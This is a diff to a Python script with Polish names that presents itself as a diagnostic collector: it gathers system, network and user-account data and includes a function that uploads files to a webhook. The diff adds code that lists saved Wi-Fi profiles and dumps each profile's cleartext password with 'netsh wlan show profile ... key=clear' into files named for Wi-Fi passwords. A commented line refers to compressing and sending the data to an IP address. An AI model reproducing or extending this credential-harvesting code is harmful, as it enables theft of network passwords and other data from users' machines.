@@ -1,8 +1,8 @@
 import os
 import subprocess
 import requests
-
 SCIEZKA_DO_FOLDERU = "C:\\dane_diagnostyczne"
+
 
 def wyslij_plik_do_webhooka(webhook_url, folder_path, file_name):
     file_path = os.path.join(folder_path, file_name)
@@ -27,6 +27,25 @@ def usun_pliki_z_diagnozy():
         print("Pliki z diagnozy zostały usunięte.")
     else:
         print("Folder 'dane_diagnostyczne' nie został znaleziony lub nie ma w nim plików.")
+
+file_path = "C:\\dane_diagnostyczne\\wifi.txt"
+
+def extract_wifi_profiles(file_path):
+    with open(file_path, 'r') as file:
+        lines = file.readlines()
+
+    profiles = []
+    capture = False
+
+    for line in lines:
+        line = line.strip()
+        if line == "User profiles":
+            capture = True
+        elif capture and line.startswith("All User Profile"):
+            profile_name = line.split(":")[1].strip()
+            profiles.append(profile_name)
+
+    return profiles
 
 
 def uruchom_komende(komenda, nazwa_pliku):
@@ -53,8 +72,6 @@ def main():
     run_powershell_command("Get-Process", "C:\\dane_diagnostyczne\\dane1.txt")
     run_powershell_command("Get-WmiObject Win32_PhysicalMemory", "C:\\dane_diagnostyczne\\dane2.txt")
     uruchom_komende("netstat", "C:\\dane_diagnostyczne\\net_test.txt")
-    uruchom_komende("tasklist", "C:\\dane_diagnostyczne\\aktywneProgramy.txt")
-    run_powershell_command("get-process", "C:\\dane_diagnostyczne\\id.txt")
     run_powershell_command("Get-NetAdapter", "C:\\dane_diagnostyczne\\kartysieciowe.txt")
     run_powershell_command("Get-NetConnectionProfile", "C:\\dane_diagnostyczne\\karty_bardziej_dokładnie.txt")
     run_powershell_command("Get-WmiObject -Class Win32_LogicalDisk", "C:\\dane_diagnostyczne\\dyski.txt")
@@ -62,6 +79,12 @@ def main():
     run_powershell_command("Get-NetUDPEndpoint", "C:\\dane_diagnostyczne\\ip4.txt")
     run_powershell_command("Get-NetFirewallSetting | Select-Object", "C:\\dane_diagnostyczne\\siec2.txt")
     run_powershell_command("Get-WmiObject -Class Win32_UserAccount", "C:\\dane_diagnostyczne\\użytkownicy.txt")
+    run_powershell_command("netsh wlan show profile", "C:\\dane_diagnostyczne\\wifi.txt")
+    wifi_profiles = extract_wifi_profiles(file_path)
+    x: int = 0
+    for wifi in wifi_profiles:
+        run_powershell_command(f'netsh wlan show profile {wifi} key=clear', f'C:\\dane_diagnostyczne\\haslaDowiFI{x}.txt')
+        x += 1
 
     # compressAndSend(folderPath, zipFileName, destinationIP);  funkcja od wysyłania
 
